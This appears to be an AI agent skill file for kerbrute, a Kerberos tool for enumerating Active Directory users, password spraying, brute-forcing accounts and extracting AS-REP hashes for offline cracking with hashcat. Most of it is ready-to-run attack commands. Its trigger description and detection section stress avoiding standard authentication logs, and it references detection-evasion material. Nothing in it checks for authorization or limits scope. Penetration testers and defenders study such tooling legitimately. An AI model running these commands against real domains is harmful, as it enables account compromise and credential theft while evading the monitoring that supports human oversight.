---
name: kerbrute
description: "Kerberos-based user enumeration and password spraying tool for Active Directory. Use when asked to enumerate valid AD usernames via Kerberos pre-auth, perform password spraying against AD, brute-force a specific user's password, or identify valid accounts without triggering standard auth logs."
license: MIT
compatibility: "Linux, Windows, macOS. Install: go install github.com/ropnop/kerbrute@latest or download binary from GitHub releases."
metadata:
  author: AeonDave
  version: "1.0"
---

# Kerbrute

Fast Kerberos user enumeration and password spraying — leverages Kerberos pre-auth errors for stealthy enumeration.

## Quick Start

```bash
# Enumerate valid users
kerbrute userenum -d domain.local --dc dc.domain.local users.txt

# Password spray
kerbrute passwordspray -d domain.local --dc dc.domain.local users.txt "Password123"

# Brute-force single user
kerbrute bruteuser -d domain.local --dc dc.domain.local passwords.txt john.doe
```

## Sub-commands

| Command | Description |
|---------|-------------|
| `userenum` | Enumerate valid usernames via Kerberos pre-auth |
| `passwordspray` | Spray a single password against many users |
| `bruteuser` | Brute-force a single user's password |
| `bruteforce` | Brute-force user\:password pairs from file |

## Core Flags

| Flag | Description |
|------|-------------|
| `-d <domain>` | Target domain (e.g., `domain.local`) |
| `--dc <dc>` | Domain controller IP or hostname |
| `-t <n>` | Threads (default 10) |
| `-o <file>` | Output valid accounts to file |
| `--hash-file <file>` | Output found hashes to file (AS-REP roasting) |
| `--downgrade` | Force RC4 (weaker) encryption |
| `-v` | Verbose |
| `--safe` | Lock out protection (stop at 3 failures per user) |
| `--delay <ms>` | Delay between requests (milliseconds) |

## Common Workflows

```bash
# User enumeration from a username list
kerbrute userenum -d corp.local --dc 10.10.10.1 usernames.txt -o valid_users.txt -v

# Generate usernames from a name list first
# e.g., john.doe, jdoe, johnd, etc.

# Safe password spray (avoid lockouts)
kerbrute passwordspray -d corp.local --dc 10.10.10.1 valid_users.txt "Spring2024!" \
  --safe --delay 1000

# Get AS-REP hashes for users without pre-auth (then crack offline)
kerbrute userenum -d corp.local --dc 10.10.10.1 users.txt --hash-file asrep_hashes.txt
# Crack with hashcat: hashcat -a 0 -m 18200 asrep_hashes.txt rockyou.txt

# Combined spray + extract
kerbrute bruteforce -d corp.local --dc 10.10.10.1 user_pass_pairs.txt
```

## Detection

Kerbrute generates **KDC_ERR_C_PRINCIPAL_UNKNOWN** errors for invalid users (event 4768 not generated). Valid user hits produce **KDC_ERR_PREAUTH_FAILED** (logged as 4771). Much stealthier than LDAP enumeration.

## Resources

| File | When to load |
|------|--------------|
| `references/attacks.md` | Kerberos attack chain (AS-REP roasting, Kerberoasting), username generation, detection evasion |

## Structuring This Skill
